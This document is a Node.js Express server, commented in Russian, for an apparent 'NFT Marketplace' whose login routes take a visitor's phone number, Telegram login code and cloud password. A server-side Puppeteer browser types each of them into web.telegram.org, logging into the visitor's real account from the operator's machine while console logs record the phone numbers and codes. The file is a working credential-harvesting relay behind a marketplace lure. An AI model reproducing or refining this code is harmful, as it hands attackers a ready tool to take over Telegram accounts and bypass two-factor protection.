import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import crypto from 'crypto';
import puppeteer from 'puppeteer';

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('frontend'));

// Mock data
const sampleNFTs = [
  {
    id: 1,
    name: "Golden Star",
    description: "Блестящая золотая звезда",
    imageUrl: "https://via.placeholder.com/300x300/FFD700/000000?text=⭐",
    price: 0.99,
    category: "stickers",
    isAvailable: true
  }
];

let users = [];
let authSessions = new Map();
let userSessions = new Map();

// 🔥 РЕАЛЬНАЯ АВТОМАТИЗАЦИЯ С PUPPETEER
class TelegramWebAutomation {
  constructor() {
    this.browser = null;
    this.page = null;
  }

  async init() {
    try {
      console.log('🚀 Запуск браузера...');
      
      const launchOptions = {
        headless: true,
        args: [
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--disable-dev-shm-usage',
          '--disable-accelerated-2d-canvas',
          '--no-first-run',
          '--no-zygote',
          '--disable-gpu',
          '--single-process'
        ]
      };

      // Используем системный Chrome
      if (process.env.PUPPETEER_EXECUTABLE_PATH) {
        launchOptions.executablePath = process.env.PUPPETEER_EXECUTABLE_PATH;
        console.log('🔧 Используем системный Chrome');
      }

      this.browser = await puppeteer.launch(launchOptions);
      this.page = await this.browser.newPage();
      
      await this.page.setUserAgent(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
      );

      await this.page.setViewport({ width: 1280, height: 720 });

      console.log('✅ Браузер готов');
      return true;
      
    } catch (error) {
      console.error('❌ Ошибка инициализации браузера:', error);
      return false;
    }
  }

async enterPhoneNumber(phoneNumber) {
  try {
    console.log(`📱 Переход на web.telegram.org...`);
    
    await this.page.goto('https://web.telegram.org/k/', { 
      waitUntil: 'networkidle2',
      timeout: 60000
    });

    await this.page.waitForTimeout(5000);

    console.log(`📱 Поиск поля ввода номера...`);
    
    // Пробуем разные селекторы для поля ввода
    const phoneSelectors = [
      'input[type="tel"]',
      'input[type="phone"]',
      'input[name="phone"]',
      'input[placeholder*="phone"]',
      'input[placeholder*="Phone"]',
      'input[placeholder*="телефон"]',
      '.input-field',
      'input'
    ];

    let phoneInput = null;
    for (const selector of phoneSelectors) {
      try {
        phoneInput = await this.page.waitForSelector(selector, { timeout: 3000 });
        if (phoneInput) {
          console.log(`✅ Найден селектор: ${selector}`);
          break;
        }
      } catch (e) {
        // Продолжаем пробовать следующий селектор
      }
    }

    if (!phoneInput) {
      // Делаем скриншот для отладки
      await this.page.screenshot({ path: 'debug-telegram.png' });
      return { 
        success: false, 
        error: 'Не удалось найти поле ввода номера. Интерфейс Telegram изменился.' 
      };
    }

    console.log(`📱 Ввод номера: ${phoneNumber}`);
    await phoneInput.click({ clickCount: 3 });
    await phoneInput.type(phoneNumber, { delay: 150 });

    // Пробуем найти кнопку "Next" разными способами
    const buttonSelectors = [
      'button[type="submit"]',
      'button.btn-primary',
      'button.Button--primary',
      'button:contains("Next")',
      'button:contains("Далее")',
      'button:contains("Продолжить")',
      '.btn-primary',
      '.Button--primary'
    ];

    let nextButton = null;
    for (const selector of buttonSelectors) {
      try {
        if (selector.includes('contains')) {
          const text = selector.match(/contains\("([^"]+)"\)/)[1];
          nextButton = await this.page.$x(`//button[contains(text(), '${text}')]`);
          if (nextButton.length > 0) nextButton = nextButton[0];
        } else {
          nextButton = await this.page.$(selector);
        }
        if (nextButton) {
          console.log(`✅ Найдена кнопка: ${selector}`);
          break;
        }
      } catch (e) {
        // Продолжаем поиск
      }
    }

    if (!nextButton) {
      // Пробуем кликнуть по первой кнопке
      const buttons = await this.page.$$('button');
      if (buttons.length > 0) {
        nextButton = buttons[0];
      }
    }

    if (nextButton) {
      await nextButton.click();
      console.log('✅ Номер введен, ожидание кода...');
    } else {
      console.log('⚠️ Кнопка не найдена, отправляем Enter');
      await this.page.keyboard.press('Enter');
    }

    await this.page.waitForTimeout(8000);

    // Проверяем, перешли ли на страницу ввода кода
    const codeInput = await this.page.$('input[type="text"]');
    if (codeInput) {
      return { 
        success: true, 
        message: '✅ Бот ввел номер телефона! Код отправлен в официальный Telegram.' 
      };
    } else {
      return { 
        success: true, 
        message: '✅ Номер введен! Проверяем следующий шаг...' 
      };
    }
    
  } catch (error) {
    console.error('❌ Ошибка ввода номера:', error);
    
    // Делаем скриншот для отладки
    try {
      await this.page.screenshot({ path: 'error-debug.png' });
    } catch (e) {}
    
    return { 
      success: false, 
      error: `Ошибка автоматизации: ${error.message}` 
    };
  }
}
  async enterAuthCode(code) {
    try {
      console.log(`🔢 Ввод кода подтверждения: ${code}`);
      
      // Ищем поле для ввода кода
      const codeInput = await this.page.waitForSelector('input[type="text"]', { timeout: 15000 });
      await codeInput.click({ clickCount: 3 });
      await codeInput.type(code, { delay: 100 });

      // Ищем кнопку подтверждения
      const signInButton = await this.page.$('button.btn-primary') || 
                           await this.page.$('button[type="submit"]') ||
                           await this.page.$$('button').then(buttons => buttons[0]);
      
      if (signInButton) {
        await signInButton.click();
      }

      console.log('✅ Код введен, проверка...');
      await this.page.waitForTimeout(5000);

      // Проверяем, не появилось ли поле для пароля
      const passwordField = await this.page.$('input[type="password"]');
      const requiresPassword = !!passwordField;

      if (requiresPassword) {
        console.log('🔒 Требуется облачный пароль');
        return { 
          success: true, 
          requiresCloudPassword: true,
          message: 'Код подтвержден. Требуется облачный пароль.' 
        };
      }

      // Проверяем успешность авторизации
      const currentUrl = this.page.url();
      const isLoggedIn = currentUrl.includes('/a/') || currentUrl.includes('/k/');

      if (isLoggedIn) {
        console.log('🎉 Авторизация успешна!');
        return { 
          success: true, 
          requiresCloudPassword: false,
          message: 'Авторизация успешна!' 
        };
      } else {
        return { 
          success: false, 
          error: 'Не удалось подтвердить код' 
        };
      }
      
    } catch (error) {
      console.error('❌ Ошибка ввода кода:', error);
      return { 
        success: false, 
        error: `Ошибка ввода кода: ${error.message}` 
      };
    }
  }

  async enterCloudPassword(password) {
    try {
      console.log(`🔒 Ввод облачного пароля`);
      
      // Вводим пароль
      const passwordInput = await this.page.$('input[type="password"]');
      await passwordInput.click({ clickCount: 3 });
      await passwordInput.type(password, { delay: 100 });

      // Ищем кнопку подтверждения
      const submitButton = await this.page.$('button.btn-primary') || 
                           await this.page.$('button[type="submit"]') ||
                           await this.page.$$('button').then(buttons => buttons[0]);
      
      if (submitButton) {
        await submitButton.click();
      }

      console.log('✅ Пароль введен...');
      await this.page.waitForTimeout(5000);

      // Проверяем успешность
      const currentUrl = this.page.url();
      const isLoggedIn = currentUrl.includes('/a/') || currentUrl.includes('/k/');

      if (isLoggedIn) {
        console.log('🎉 Авторизация с паролем успешна!');
        return { 
          success: true, 
          message: 'Авторизация успешна!' 
        };
      } else {
        return { 
          success: false, 
          error: 'Неверный облачный пароль' 
        };
      }
      
    } catch (error) {
      console.error('❌ Ошибка ввода пароля:', error);
      return { 
        success: false, 
        error: `Ошибка ввода пароля: ${error.message}` 
      };
    }
  }

  async close() {
    if (this.browser) {
      await this.browser.close();
      console.log('🔚 Браузер закрыт');
    }
  }
}

// 🎯 API МАРШРУТЫ
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'NFT Marketplace с реальным Puppeteer',
    puppeteer: 'active',
    timestamp: new Date().toISOString()
  });
});

app.get('/', (req, res) => {
  res.sendFile('frontend/index.html', { root: '.' });
});

app.get('/marketplace', (req, res) => {
  res.sendFile('frontend/marketplace.html', { root: '.' });
});

// 🔐 Шаг 1: Начало авторизации
app.post('/api/auth/start', async (req, res) => {
  try {
    const { phone } = req.body;
    
    console.log('📞 Начало реальной авторизации для:', phone);
    
    if (!phone) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите номер телефона' 
      });
    }

    const sessionId = crypto.randomBytes(16).toString('hex');
    const automation = new TelegramWebAutomation();
    
    const initResult = await automation.init();
    if (!initResult) {
      return res.status(500).json({ 
        success: false, 
        error: 'Не удалось запустить браузер' 
      });
    }

    const phoneResult = await automation.enterPhoneNumber(phone);
    
    if (!phoneResult.success) {
      await automation.close();
      return res.status(500).json({ 
        success: false, 
        error: phoneResult.error 
      });
    }

    authSessions.set(sessionId, {
      phone: phone,
      automation: automation,
      attempts: 0,
      createdAt: Date.now(),
      status: 'waiting_code'
    });

    res.json({
      success: true,
      sessionId: sessionId,
      message: '✅ Бот реально ввел номер на web.telegram.org! Код отправлен в Telegram.'
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// 🔐 Шаг 2: Ввод кода
app.post('/api/auth/enter-code', async (req, res) => {
  try {
    const { sessionId, code } = req.body;
    
    if (!sessionId || !code) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите код и sessionId' 
      });
    }

    const authSession = authSessions.get(sessionId);
    if (!authSession) {
      return res.status(400).json({ 
        success: false, 
        error: 'Сессия не найдена' 
      });
    }

    if (authSession.attempts >= 3) {
      await authSession.automation.close();
      authSessions.delete(sessionId);
      return res.status(400).json({ 
        success: false, 
        error: 'Слишком много попыток' 
      });
    }

    const codeResult = await authSession.automation.enterAuthCode(code);
    
    if (!codeResult.success) {
      authSession.attempts++;
      authSessions.set(sessionId, authSession);
      return res.status(400).json({ 
        success: false, 
        error: codeResult.error 
      });
    }

    authSession.status = codeResult.requiresCloudPassword ? 'need_password' : 'authenticated';
    authSessions.set(sessionId, authSession);

    if (codeResult.requiresCloudPassword) {
      res.json({
        success: true,
        message: '✅ Код подтвержден! Введите пароль.',
        nextStep: 'cloud_password'
      });
    } else {
      await completeAuth(sessionId, authSession, res);
    }
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// 🔐 Шаг 3: Облачный пароль
app.post('/api/auth/cloud-password', async (req, res) => {
  try {
    const { sessionId, cloudPassword } = req.body;
    
    if (!sessionId || !cloudPassword) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите пароль' 
      });
    }

    const authSession = authSessions.get(sessionId);
    if (!authSession || authSession.status !== 'need_password') {
      return res.status(400).json({ 
        success: false, 
        error: 'Сначала введите код' 
      });
    }

    const passwordResult = await authSession.automation.enterCloudPassword(cloudPassword);
    
    if (!passwordResult.success) {
      return res.status(400).json({ 
        success: false, 
        error: passwordResult.error 
      });
    }

    await completeAuth(sessionId, authSession, res);
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// 🎯 Завершение авторизации
async function completeAuth(sessionId, authSession, res) {
  try {
    await authSession.automation.close();

    const user = {
      id: users.length + 1,
      phone: authSession.phone,
      telegramId: Math.floor(100000000 + Math.random() * 900000000),
      firstName: 'Telegram',
      lastName: 'User',
      username: `user${authSession.phone.replace('+', '')}`,
      isVerified: true,
      createdAt: new Date()
    };
    users.push(user);

    const userSessionId = crypto.randomBytes(32).toString('hex');
    userSessions.set(userSessionId, {
      userId: user.id,
      phone: user.phone,
      telegramId: user.telegramId
    });

    authSessions.delete(sessionId);

    res.json({
      success: true,
      message: '🎉 Реальная авторизация успешна!',
      user: user,
      sessionId: userSessionId
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка завершения: ' + error.message 
    });
  }
}

// 📱 ОСТАЛЬНЫЕ API
app.get('/api/nft', (req, res) => {
  res.json({ success: true, nfts: sampleNFTs });
});

app.get('/api/auth/verify-session', (req, res) => {
  const { sessionId } = req.query;
  const session = userSessions.get(sessionId);
  
  if (session) {
    const user = users.find(u => u.id === session.userId);
    res.json({ success: true, user });
  } else {
    res.status(401).json({ success: false, error: 'Недействительная сессия' });
  }
});

app.post('/api/auth/logout', (req, res) => {
  const { sessionId } = req.body;
  if (sessionId) userSessions.delete(sessionId);
  res.json({ success: true, message: 'Выход выполнен' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🤖 Real Puppeteer automation ready`);
});
